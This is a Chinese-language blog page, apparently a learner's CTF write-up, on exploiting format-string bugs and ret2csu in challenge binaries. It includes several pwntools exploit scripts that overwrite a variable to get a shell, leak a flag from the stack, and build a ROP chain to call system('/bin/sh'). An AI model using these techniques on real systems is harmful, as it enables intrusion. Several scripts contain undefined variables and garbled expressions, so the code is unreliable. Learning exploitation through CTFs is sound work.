@@ -1,0 +1,574 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>格式化字符串与 ret2csu | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>格式化字符串与 ret2csu</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #ff7d73">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/fmt/" style="color: #00bcd4">
+                    fmt
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2csu/" style="color: #03a9f4">
+                    ret2csu
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="fmt1"><a href="#fmt1" class="headerlink" title="fmt1"></a>fmt1</h2><p>首先来看一下这道fmt1</p>
+<p>先来分析一下main函数。里面这个ctfshow可能存在漏洞点</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572509-c5da82e5-e24d-42f4-b3a5-8bb418f3ce24.png"></p>
+<p>再看底下如果daniu等于6，就会触发shell。把这个daniu写成6就行了。用栈溢出或者格式化字符串。这个既然都写fmt了。应该是要格式化字符串的。</p>
+<p>先假装不知道看一下这个ctfshow函数。拿ai计算了一下为啥不能栈溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572665-69d84379-4566-40f2-84b0-b3a0c7edcdb2.png"></p>
+<p>算出来这个v2的地址离s还有1个字节。也就是没法栈溢出的</p>
+<pre><code class="language-plain">s的结束地址 = ebp-0x5C + 79 = ebp-0x5C + 0x4F = ebp-0xD
+v2的地址   = ebp-0xC
+间隔       = ebp-0xC - (ebp-0xD) = 1字节
+</code></pre>
+<p>格式化字符串怎么写一下这个payload</p>
+<p>用readlef找一下这个daniu的地址</p>
+<pre><code class="language-plain">readelf -s ./fmt1 | grep daniu
+</code></pre>
+<p>然后确定偏移量</p>
+<p>构造一个包含 <strong>唯一标记</strong>（如 <code>AAAA</code>）和多个 <code>%p</code> 的字符串，发送到程序：</p>
+<p>寻找 <code>AAAA</code> 的十六进制形式 <code>0x41414141</code> 在输出中的位置。 上例中 <code>0x41414141</code> 出现在第 <strong>3</strong> 个 <code>%p</code> 的位置，因此偏移量 <strong>k &#x3D; 3</strong>。</p>
+<p>这是在网上找的方法，还不知道具体原理</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572693-b9b4eb01-0b5b-4ac8-853f-7a014329757c.png"></p>
+<p>在第七个，然后用自动生成的工具生成</p>
+<pre><code class="language-plain">payload = fmtstr_payload(7, &#123;daniu: 6&#125;)
+</code></pre>
+<p>exp</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./fmt1&#39;)
+gdb.attach(p,&#39;b main&#39;)
+
+daniu = 0x804b038
+payload = fmtstr_payload(7, &#123;daniu: 6&#125;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>（第一次没弄好。忘把context里的arch改成i386了🙂）</p>
+<h2 id="fmt2"><a href="#fmt2" class="headerlink" title="fmt2"></a>fmt2</h2><p>这道题先分析反汇编</p>
+<p>我们可以看到它定义了好多变量还是地址的东西（v6~v12）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572802-46b6019b-0f34-41a8-b4da-b5fcd4f6dc01.png"></p>
+<p>然后它和上一道题一样它有一个 v12 &#x3D; __readfsqword(0x28u);栈保护。</p>
+<p>这道题应该是可以栈溢出的。应该也是算一下v12到s的距离。</p>
+<h2 id="思路是要格式化字符串泄露flag"><a href="#思路是要格式化字符串泄露flag" class="headerlink" title="思路是要格式化字符串泄露flag"></a>思路是要格式化字符串泄露flag</h2><p>这道题就是要读取栈上某一个特定空间的的内容。flag规定在那个地方里。它到那个地方会自动读取系统里叫flag.txt的文件。做到payload可以读取</p>
+<p>第一次在网上找了一种思路。这道题flag在栈上，那就要想办法通过格式化字符串泄露栈上的数据。就是要泄露s的里面的东西</p>
+<p>自动生成的fmtstr_payload是用来覆盖的。要读取flag就需要手写一个。但是这手写就比较难</p>
+<p>思路是这样的，要先通过格式化字符串泄露一次栈上的数据。然后再泄露flag</p>
+<p>先要写泄露栈地址的（第一次是照着网上模仿的写的）.要发送一个payload,再接收</p>
+<p>这个%n$p 就是说以指针形式读取栈上第n个参数的值。</p>
+<p>然后接下来处理数据，遇到#就不接收。新学了一个这个</p>
+<pre><code class="language-plain">drop=True
+</code></pre>
+<p>丢弃结束符用的。然后空指针（nil）替换成0.（这个是问ai哪有问题的时候它加的）</p>
+<p>最后将接收到的data1按16进制0x分割。</p>
+<pre><code class="language-sql">p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:]  # 提取有效地址部分
+</code></pre>
+<p>我第一次写的时候是没有这个for循环来处理16进制字符串长度的（后续再说这个）</p>
+<p>字节的小端序转换</p>
+<pre><code class="language-plain">bytes.fromhex(&#39;67616c66&#39;) → b&#39;galf&#39;  
+[::-1] → b&#39;flag&#39;  # 反转后得到正确顺序
+</code></pre>
+<p>这样多次拼接就可以拼出flag</p>
+<p>第一次直接照着网上的这样写，直接用了一下</p>
+<pre><code class="language-plain">b.pop(0) #它说这个是移除第一个元素
+c = [bytes.fromhex(i)[::-1] for i in b]
+d = b&#39;&#39;.join(c)
+</code></pre>
+<p>最后打印出来泄露的东西</p>
+<p>第二次泄露跟第一次差不多，要注意的就是泄露的第几个参数的值改一下</p>
+<p>第一次的exp：</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p = process(&quot;./fmt2&quot;)
+gdb.attach(p, &#39;b main&#39;)
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:] 
+b.pop(0)
+c = [bytes.fromhex(i)[::-1] for i in b]  
+d = b&#39;&#39;.join(c)
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%16$p%17$p%18$p%19$p#&#39;)
+data2 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts2 = data1.split(&#39;0x&#39;)[1:] 
+b.pop(0)
+c = [bytes.fromhex(i)[::-1] for i in b]  
+d = b&#39;&#39;.join(c)
+print(d)
+
+p.interactive()
+</code></pre>
+<p>然后它报这个错</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572681-a301c06b-5475-45ff-acd4-921e1e418f6b.png"></p>
+<p>查了以后这个报错说是16进制字符串转化成字节的时候遇到了非法字符</p>
+<p>我以为是我写的不规范，把这个网上找的转换的这段重新写一下。</p>
+<pre><code class="language-python">raw_bytes = b&#39;&#39;
+byte_data = bytes.fromhex(addr)
+reversed_bytes = byte_data[::-1]
+raw_bytes += reversed_bytes
+</code></pre>
+<p>发现还是和原来一样的报错</p>
+<p>然后这中间还有一个问题。我没写这个.txt文件😐。补充.txt文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573531-b35b908e-9ddb-4ed9-8c15-465cb31bf7ba.png"></p>
+<p>然后我问ai,它回答这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573587-dd9df222-75b7-432b-a0d6-2d8f7b1c6587.png"></p>
+<p>可能这个flag转换的时候出现了奇数长度。总之要想办法转换</p>
+<p>这ai底下直接给了一个for循环，把原来泄露的都能成功接收了。（这也太好了吧）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573686-fe5b2474-cc45-4af3-83f3-cba809fa5d7e.png"></p>
+<p>然后还扩展了一下混合的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573479-2771243b-4cb4-4053-9ccb-ceed6dbc86ea.png"></p>
+<p>把这段for循环的放到接收处理数据那一块。最后再改一下转换，打印。</p>
+<p>（这个试的时候到12个printf后面就是flag。其实第10个就有flag了）</p>
+<h2 id="从第几个开始写"><a href="#从第几个开始写" class="headerlink" title="从第几个开始写"></a>从第几个开始写</h2><p>64位，它前六个在寄存器里。从第7个之后开始写都行。</p>
+<p>先算偏移量</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573810-7deb0323-5186-4b17-b3b7-3a9041a19964.png"></p>
+<p>是8</p>
+<p>再算s到格式化字符串.rbp-40可以算一下s</p>
+<p>这个我不太会算。看了答案以后知道是从12个。就开始试。它这fgets有个限制最多只能写50个字节覆盖s。这个发payload的时候不要超过50个。一个%12$是8个，先发4个试一下</p>
+<pre><code class="language-plain">fgets(s, 50, stream);
+</code></pre>
+<p>这是9的时候：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574298-7a082a40-4648-45ea-a487-6d7cbb0c1e12.png"></p>
+<p>10：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574249-a7b12da0-8bdf-4b89-b38c-19fe07741058.png"></p>
+<p>最终exp（终于对了一次）</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p = process(&quot;./fmt2&quot;)
+gdb.attach(p, &#39;b main&#39;) 
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:] 
+raw_bytes = b&#39;&#39;
+for addr_part in parts1:
+    if len(addr_part) % 2 != 0:
+        addr_part = &#39;0&#39; + addr_part
+    padded = addr_part.ljust(16, &#39;0&#39;)  
+    raw_bytes += bytes.fromhex(padded)[::-1]
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%16$p%17$p%18$p%19$p#&#39;)
+data2 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts2 = data2.split(&#39;0x&#39;)[1:]
+for addr_part in parts2:
+    if len(addr_part) % 2 != 0:
+        addr_part = &#39;0&#39; + addr_part
+    padded = addr_part.ljust(16, &#39;0&#39;) 
+    raw_bytes += bytes.fromhex(padded)[::-1]
+
+print(&quot;flag is in the behide :&quot;, raw_bytes)
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574296-5a7cd76f-6757-453a-ac3a-ddb647061c64.png"></p>
+<p>这个最后如果要提交的话要记得去掉 \x00 把用零补齐的去掉</p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><h2 id="retcsu"><a href="#retcsu" class="headerlink" title="retcsu"></a>retcsu</h2><p>retcsu跟libc有点像</p>
+<p>这是第一次它说接收有点问题。</p>
+<pre><code class="language-python">from pwn import *
+
+# 设置调试环境
+p = process(&#39;./ret2csu&#39;)
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;info&#39;)
+
+# 加载文件
+elf = ELF(&#39;./ret2csu&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def dec(data):
+    # 解密过程：先异或还原，再逆向位移操作
+    result = []
+    for byte in data:
+        xor_byte = byte ^ 0x5A
+        # 2. 逆向位移操作（加密是右移3位+左移5位）
+        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
+        original = ((xor_byte &gt; 5)) &amp; 0xFF
+        result.append(original)
+    return bytes(result)
+
+# 第一阶段：泄露write地址
+
+# 准备溢出数据
+padding = b&#39;a&#39; * 24  # 覆盖缓冲区
+
+# 使用csu_init中的gadgets
+csu_pop = 0x4013AA    # 弹出寄存器的地址
+csu_call = 0x401390   # 调用函数的地址
+
+# 构造ROP链
+payload = padding
+payload += p64(csu_pop)
+payload += p64(0)      # rbx
+payload += p64(1)      # rbp
+payload += p64(elf.got[&#39;write&#39;])  # r12 -&gt; 要调用的函数地址
+payload += p64(8)      # r13 -&gt; rdx (长度)
+payload += p64(elf.got[&#39;write&#39;]) # r14 -&gt; rsi (buffer地址)
+payload += p64(1)      # r15 -&gt; rdi (文件描述符)
+payload += p64(csu_call)  # 调用write(1, write@got, 8)
+payload += b&#39;B&#39;*56     # 填充剩余空间
+payload += p64(elf.symbols[&#39;main&#39;]) # 返回main重新执行
+
+# 发送加密后的payload
+p.sendline(enc(payload))
+
+# 接收泄露的地址
+real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+libc_base = write_addr - libc.symbols[&#39;write&#39;]
+log.success(f&quot;libc base: &#123;hex(libc_base)&#125;&quot;)
+
+# 第二阶段：执行system(&quot;/bin/sh&quot;)
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+
+# 构造新payload
+payload2 = padding
+payload2 += p64(0x40101a)    # 栈对齐用的ret指令
+payload2 += p64(0x4013b3)    # pop rdi; ret
+payload2 += p64(bin_sh)      # 参数：/bin/sh地址
+payload2 += p64(system_addr) # 调用system
+
+# 发送并获取shell
+p.sendline(enc(payload2))
+p.interactive()
+</code></pre>
+<p>先要找到rdi，rsi的地址。不找write的plt和got表也行。直接elf打开</p>
+<p>再找一个ret的地址。用来栈对齐。（这段没写完，解密有点问题。导致接收不到）</p>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2csu&#39;)
+elf=ELF(&#39;./ret2csu&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+#jiemi
+def dec(data):
+    # 解密过程：先异或还原，再逆向位移操作
+    result = []
+    for byte in data:
+        xor_byte = byte ^ 0x5A
+        # 2. 逆向位移操作（加密是右移3位+左移5位）
+        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
+        original = ((xor_byte &gt; 5)) &amp; 0xFF
+        result.append(original)
+    return bytes(result)
+#address
+gadget2=0x401390
+gadget1=0x4013AA
+write_got=elf.got[&#39;write&#39;]
+write_plt=elf.plt[&#39;write&#39;]
+main_addr=elf.symbols[&#39;main&#39;]
+pop_rdi_ret=0x4013b3
+pop_rsi_ret=0x4013b1
+ret=0x40101a
+
+#first payload
+payload=b&#39;a&#39;*0x18
+payload+=p64(gadget1)
+payload+=p64(0)
+payload+=p64(1)
+payload+=p64(1)
+payload+=p64(write_got)
+payload+=p64(8)
+payload+=p64(write_got)
+payload+=p64(gadget2)
+payload+=b&#39;a&#39;*0x38
+payload+=p64(main_addr)
+
+p.sendline(dec(payload))
+p.sendline(payload)
+p.recvuntil(b&#39;Encrypted: &#39;)
+p.recvuntil(b&#39;\n&#39;)
+
+real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;real_address: &quot;,hex(real_address))
+#count libc,system,bin/sh
+libc_base = real_address -libc.sym[&#39;write&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+#second payload
+payload=b&#39;a&#39;*0x18
+payload+=p64(ret)
+payload+=p64(pop_rdi_ret)
+payload+=p64(binsh_address)
+payload+=p64(system_address)
+
+p.sendline(dec(payload))
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
